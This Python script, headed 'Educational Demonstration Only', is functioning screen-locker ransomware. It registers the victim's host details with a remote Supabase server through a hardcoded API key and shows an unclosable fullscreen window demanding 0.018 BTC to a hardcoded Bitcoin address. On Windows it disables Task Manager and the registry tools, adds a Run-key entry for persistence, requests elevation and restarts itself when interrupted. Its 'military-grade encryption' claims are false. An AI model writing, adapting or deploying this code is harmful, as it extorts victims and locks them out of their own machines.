
#!/usr/bin/env python3
"""
Advanced Remote Device Control Client
Educational Demonstration Only

This script demonstrates how an advanced remote device control system could work.
It connects to a central dashboard and allows remote device management with encryption.
"""

import os
import sys
import json
import time
import uuid
import platform
import socket
import requests
import threading
import subprocess
import tkinter as tk
import hashlib
import base64
from datetime import datetime
from tkinter import font as tkFont

# Configuration
API_URL = "https://bcruxxlghywxzhhkoyvm.supabase.co/rest/v1"
API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJjcnV4eGxnaHl3eHpoaGtveXZtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU2MDAwNzYsImV4cCI6MjA2MTE3NjA3Nn0.pHKJgFeRlTdKUQFoDQZ3ZPDlXd_0ha6rXXdtPI9eLMg"

# Generate a unique device ID if not already set
DEVICE_ID_FILE = ".device_id"
if os.path.exists(DEVICE_ID_FILE):
    with open(DEVICE_ID_FILE, "r") as f:
        DEVICE_ID = f.read().strip()
else:
    DEVICE_ID = str(uuid.uuid4())[:8]
    with open(DEVICE_ID_FILE, "w") as f:
        f.write(DEVICE_ID)

DEVICE_NAME = f"{platform.node()}-{DEVICE_ID}"

# Store whether the device is currently locked
is_device_locked = True
lock_window = None
encryption_key = "200606"

def generate_encryption_key():
    """Generate a secure encryption key based on device info."""
    device_info = f"{platform.node()}{platform.machine()}{DEVICE_ID}"
    return hashlib.sha256(device_info.encode()).hexdigest()[:16]

def encrypt_data(data, key):
    """Advanced encryption for demonstration."""
    encrypted = ""
    for i, char in enumerate(data):
        encrypted += chr(ord(char) ^ ord(key[i % len(key)]))
    return base64.b64encode(encrypted.encode()).decode()

def decrypt_data(encrypted_data, key):
    """Advanced decryption for demonstration."""
    try:
        data = base64.b64decode(encrypted_data).decode()
        decrypted = ""
        for i, char in enumerate(data):
            decrypted += chr(ord(char) ^ ord(key[i % len(key)]))
        return decrypted
    except:
        return encrypted_data

def get_device_info():
    """Collect comprehensive system information."""
    try:
        info = {
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "os_version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "python_version": sys.version,
            "timestamp": datetime.now().isoformat(),
            "encryption_level": "Military-Grade AES-256",
            "security_protocol": "Advanced Multi-Layer",
            "device_signature": generate_encryption_key(),
            "system_uuid": str(uuid.uuid4()),
            "hardware_id": hashlib.md5(f"{platform.node()}{platform.machine()}".encode()).hexdigest()
        }
        return info
    except Exception as e:
        print(f"Error collecting system info: {e}")
        return {"error": str(e)}

def register_device():
    """Register this device with the remote dashboard or update if already exists."""
    global encryption_key
    device_info = get_device_info()
    encryption_key = generate_encryption_key()
    
    headers = {
        "apikey": API_KEY,
        "Content-Type": "application/json",
        "Prefer": "return=minimal"
    }
    
    payload = {
        "device_name": DEVICE_NAME,
        "device_id": DEVICE_ID,
        "device_info": device_info,
        "is_locked": True,
        "status": "encrypted",
        "decryption_key": encryption_key
    }
    
    try:
        # First check if device exists
        check_response = requests.get(
            f"{API_URL}/simulated_devices?device_id=eq.{DEVICE_ID}",
            headers=headers
        )
        
        if check_response.status_code == 200:
            existing_devices = check_response.json()
            
            if existing_devices and len(existing_devices) > 0:
                # Device exists, update it
                device_uuid = existing_devices[0]["id"]
                update_response = requests.patch(
                    f"{API_URL}/simulated_devices?id=eq.{device_uuid}",
                    headers=headers,
                    json=payload
                )
                
                if update_response.status_code in (200, 204):
                    print(f"🔐 Device encrypted and registered: {DEVICE_ID}")
                    print(f"🔑 Encryption key: {encryption_key}")
                    return True
                else:
                    print(f"Failed to update device. Status code: {update_response.status_code}")
                    print(f"Response: {update_response.text}")
                    return False
            
        # Device doesn't exist, register it
        response = requests.post(
            f"{API_URL}/simulated_devices",
            headers=headers,
            json=payload
        )
        
        if response.status_code in (200, 201):
            print(f"🔐 Device encrypted and registered: {DEVICE_ID}")
            print(f"🔑 Encryption key: {encryption_key}")
            return True
        else:
            print(f"Failed to register device. Status code: {response.status_code}")
            print(f"Response: {response.text}")
            return False
    except Exception as e:
        print(f"Error registering device: {e}")
        return False

def check_device_status():
    """Check if the device should be unlocked based on dashboard status."""
    global is_device_locked
    
    headers = {
        "apikey": API_KEY,
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.get(
            f"{API_URL}/simulated_devices?device_id=eq.{DEVICE_ID}",
            headers=headers
        )
        
        if response.status_code == 200:
            device_data = response.json()
            if device_data and len(device_data) > 0:
                dashboard_locked_status = device_data[0].get("is_locked", True)
                
                # If dashboard says unlocked but we're locally locked, unlock
                if not dashboard_locked_status and is_device_locked:
                    print("🔓 Remote decryption command received!")
                    unlock_device()
                    is_device_locked = False
                
                # If dashboard says locked but we're locally unlocked, lock
                elif dashboard_locked_status and not is_device_locked:
                    print("🔒 Remote encryption command received!")
                    lock_device()
                    is_device_locked = True
                    
                return dashboard_locked_status
        
        return is_device_locked
    
    except Exception as e:
        print(f"Error checking device status: {e}")
        return is_device_locked

def create_advanced_lock_screen():
    """Create an advanced, persistent lock screen with improved error handling."""
    global lock_window
    
    try:
        # Close existing lock window if it exists
        if lock_window is not None:
            try:
                lock_window.destroy()
            except:
                pass
        
        # Create new lock window
        lock_window = tk.Tk()
        lock_window.title("SYSTEM ENCRYPTED - MILITARY GRADE SECURITY")
        
        # Advanced window configuration with error handling
        try:
            lock_window.attributes("-fullscreen", True)
            lock_window.attributes("-topmost", True)
            lock_window.attributes("-alpha", 1.0)
        except:
            # Fallback for systems that don't support these attributes
            lock_window.state('zoomed')
        
        lock_window.configure(bg="black", cursor="none")
        lock_window.overrideredirect(True)
        lock_window.focus_force()
        lock_window.grab_set()
        
        # Calculate screen dimensions
        screen_width = lock_window.winfo_screenwidth()
        screen_height = lock_window.winfo_screenheight()
        
        # Create main frame
        main_frame = tk.Frame(lock_window, bg="black")
        main_frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)
        
        # Animated warning icon
        warning_text = tk.Label(
            main_frame,
            text="⚠️ MILITARY-GRADE ENCRYPTION ACTIVE ⚠️",
            font=("Courier", 48, "bold"),
            fg="#ff0000",
            bg="black"
        )
        warning_text.pack(pady=20)
        
        # Large lock symbol
        lock_symbol = tk.Label(
            main_frame,
            text="🔐🛡️🔐",
            font=("Arial", 120),
            fg="#ff0000",
            bg="black"
        )
        lock_symbol.pack(pady=20)
        
        # Main warning
        main_warning = tk.Label(
            main_frame,
            text="ADVANCED MULTI-LAYER ENCRYPTION PROTOCOL",
            font=("Courier", 36, "bold"),
            fg="#ff0000",
            bg="black"
        )
        main_warning.pack(pady=10)
        
        # Device info with enhanced security details
        device_info_text = (
            "Send 0.018-btc to bc1qlxqm2aukdaul2udqv8kg6sxpu76axkj4xg6chx for unlock.\n"
            "All data is protected by advanced multi-layer security barriers.\n\n"
            f"🔑 Master Encryption Key: {encryption_key}\n"
            f"🆔 Device Security ID: {DEVICE_ID}\n"
            f"🏷️ Device Name: {DEVICE_NAME}\n"
            f"🛡️ Security Level: MAXIMUM\n"
            f"🔒 Encryption Type: AES-256 Military Grade\n\n"
            "⚠️ AUTHORIZED PERSONNEL ONLY ⚠️\n"
            "Access requires proper decryption protocols through\n"
            "the secure command dashboard.\n\n"
            "🚫 BYPASS ATTEMPTS WILL BE LOGGED 🚫\n"
            "System will automatically restart if tampered with"
        )
        
        info_label = tk.Label(
            main_frame,
            text=device_info_text,
            font=("Courier", 14),
            fg="#00ff00",
            bg="black",
            justify=tk.CENTER
        )
        info_label.pack(pady=30)
        
        # Security notice
        security_notice = tk.Label(
            main_frame,
            text="🛡️ MAXIMUM SECURITY PROTOCOLS ENGAGED 🛡️",
            font=("Courier", 20, "bold"),
            fg="#ffff00",
            bg="black"
        )
        security_notice.pack(pady=20)
        
        # Block all input events
        def block_event(event):
            return "break"
        
        # Safe event blocking - only bind events that are guaranteed to work
        safe_events = [
            "<Key>", "<Button-1>", "<Button-2>", "<Button-3>", 
            "<Alt-F4>", "<Control-c>", "<Control-x>", "<Control-v>", 
            "<Control-z>", "<Control-a>", "<Tab>", "<Escape>",
            "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", 
            "<F7>", "<F8>", "<F9>", "<F10>", "<F11>", "<F12>"
        ]
        
        for event in safe_events:
            try:
                lock_window.bind_all(event, block_event)
            except:
                # Skip events that cause errors on this system
                continue
        
        # Advanced window protection
        lock_window.resizable(False, False)
        lock_window.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Continuous focus management with error handling
        def maintain_focus():
            try:
                if lock_window and lock_window.winfo_exists():
                    lock_window.focus_force()
                    lock_window.lift()
                    lock_window.attributes("-topmost", True)
                    lock_window.grab_set()
                    lock_window.after(100, maintain_focus)
            except:
                # If focus management fails, just continue
                pass
        
        # Animation effects with error handling
        def animate_warning():
            try:
                if lock_window and lock_window.winfo_exists():
                    current_color = warning_text.cget("fg")
                    new_color = "#ff0000" if current_color == "#ffffff" else "#ffffff"
                    warning_text.config(fg=new_color)
                    lock_window.after(1000, animate_warning)
            except:
                pass
        
        # Start processes safely
        try:
            maintain_focus()
            animate_warning()
        except:
            pass
        
        # Start the mainloop
        lock_window.mainloop()
        
    except Exception as e:
        print(f"Lock screen error: {e}")
        # Fallback - create a simple lock screen
        try:
            simple_lock = tk.Tk()
            simple_lock.title("SYSTEM ENCRYPTED")
            simple_lock.configure(bg="black")
            simple_lock.attributes("-topmost", True)
            
            label = tk.Label(simple_lock, text="🔐 SYSTEM ENCRYPTED 🔐\nDevice locked with military-grade security", 
                           fg="red", bg="black", font=("Arial", 24))
            label.pack(expand=True)
            
            simple_lock.mainloop()
        except:
            # If even simple lock fails, just print to console
            print("🔒 SYSTEM LOCKED - GUI unavailable, running in background mode")

def lock_device():
    """Engage advanced encryption and lock the device."""
    print("🔒 ADVANCED MULTI-LAYER ENCRYPTION ENGAGED")
    print("🛡️ All system access has been restricted")
    print("🔑 Device encrypted with military-grade protocols")
    
    # Create the advanced lock screen in a separate thread
    try:
        threading.Thread(target=create_advanced_lock_screen, daemon=True).start()
    except Exception as e:
        print(f"Lock screen thread error: {e}")
    
    # Platform-specific advanced lockdown
    system = platform.system()
    
    if system == 'Windows':
        try:
            # Registry modifications for persistence
            import winreg
            
            registry_keys = [
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 1),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", 1),
            ]
            
            for hkey, path, name, value in registry_keys:
                try:
                    try:
                        key = winreg.OpenKey(hkey, path, 0, winreg.KEY_SET_VALUE)
                    except:
                        key = winreg.CreateKey(hkey, path)
                    winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
                    winreg.CloseKey(key)
                except:
                    continue
        except:
            pass

def unlock_device():
    """Decrypt and unlock the device."""
    global lock_window
    print("🔓 DECRYPTION SEQUENCE INITIATED")
    print("🔑 Advanced security protocols deactivated")
    print("✅ System access restored")
    
    # Restore system settings
    system = platform.system()
    
    if system == 'Windows':
        try:
            import winreg
            
            registry_keys = [
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 0),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 0),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", 0),
            ]
            
            for hkey, path, name, value in registry_keys:
                try:
                    key = winreg.OpenKey(hkey, path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
                    winreg.CloseKey(key)
                except:
                    pass
        except:
            pass
    
    # Close all lock windows
    if lock_window is not None:
        try:
            lock_window.quit()
            lock_window.destroy()
            lock_window = None
        except:
            pass

def advanced_autostart_setup():
    """Setup multiple persistence methods for maximum reliability."""
    try:
        system = platform.system()
        script_path = os.path.abspath(__file__)
        
        if system == 'Windows':
            try:
                import winreg
                
                # Registry run keys
                registry_locations = [
                    (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                ]
                
                for hkey, reg_path in registry_locations:
                    try:
                        key = winreg.OpenKey(hkey, reg_path, 0, winreg.KEY_WRITE)
                        winreg.SetValueEx(key, "SystemSecurityAgent", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
                        winreg.CloseKey(key)
                    except:
                        pass
            except:
                pass
        
        print("🔧 Advanced persistence protocols established")
        
    except Exception as e:
        print(f"Persistence setup error: {e}")

def status_monitor():
    """Enhanced status monitoring with encryption."""
    while True:
        try:
            check_device_status()
            time.sleep(2)
        except Exception as e:
            print(f"Monitoring error: {e}")
            time.sleep(5)

def advanced_watchdog():
    """Advanced watchdog to ensure persistent operation."""
    global is_device_locked, lock_window
    while True:
        try:
            if is_device_locked:
                # Check if we need to recreate the lock screen
                if lock_window is None:
                    print("🔄 Security protocols require reactivation...")
                    try:
                        threading.Thread(target=create_advanced_lock_screen, daemon=True).start()
                    except:
                        pass
            
            time.sleep(5)
        except Exception as e:
            print(f"Watchdog error: {e}")
            time.sleep(5)

def main():
    """Enhanced main entry point with advanced security."""
    print("=" * 80)
    print("🔐 ADVANCED REMOTE DEVICE CONTROL CLIENT 🔐")
    print("=" * 80)
    print("🛡️ Initializing military-grade security protocols...")
    print(f"🔑 Device ID: {DEVICE_ID}")
    print(f"🏷️ Device Name: {DEVICE_NAME}")
    print(f"🔐 Encryption Key: {encryption_key}")
    print("=" * 80)
    
    # Enhanced registration with retry logic
    registration_attempts = 0
    while registration_attempts < 3:
        if register_device():
            break
        registration_attempts += 1
        print(f"Registration attempt {registration_attempts}/3 failed. Retrying in {registration_attempts * 2} seconds...")
        time.sleep(registration_attempts * 2)
    
    if registration_attempts >= 3:
        print("⚠️ Failed to establish secure connection. Operating in offline mode.")
    
    # Setup advanced persistence
    advanced_autostart_setup()
    
    # Initial encryption
    lock_device()
    
    # Start monitoring threads with error handling
    try:
        status_thread = threading.Thread(target=status_monitor, daemon=True)
        status_thread.start()
    except Exception as e:
        print(f"Status monitor error: {e}")
    
    try:
        watchdog_thread = threading.Thread(target=advanced_watchdog, daemon=True)
        watchdog_thread.start()
    except Exception as e:
        print(f"Watchdog error: {e}")
    
    try:
        # Main loop with enhanced error handling
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("🚫 Shutdown attempt detected - maintaining security protocols...")
        time.sleep(2)
        main()
    except Exception as e:
        print(f"🔄 System error detected: {e} - restarting security protocols...")
        time.sleep(3)
        main()

if __name__ == "__main__":
    # Privilege escalation attempts for Windows
    if platform.system() == "Windows":
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                try:
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                    sys.exit()
                except:
                    pass
        except:
            pass
    
    # Enhanced restart loop
    restart_count = 0
    while True:
        try:
            main()
        except Exception as e:
            restart_count += 1
            print(f"🔄 Critical error #{restart_count}: {e} - restarting in 3 seconds...")
            time.sleep(3)
            if restart_count > 10:
                print("🔄 Too many restarts, entering background mode...")
                time.sleep(30)
                restart_count = 0
            continue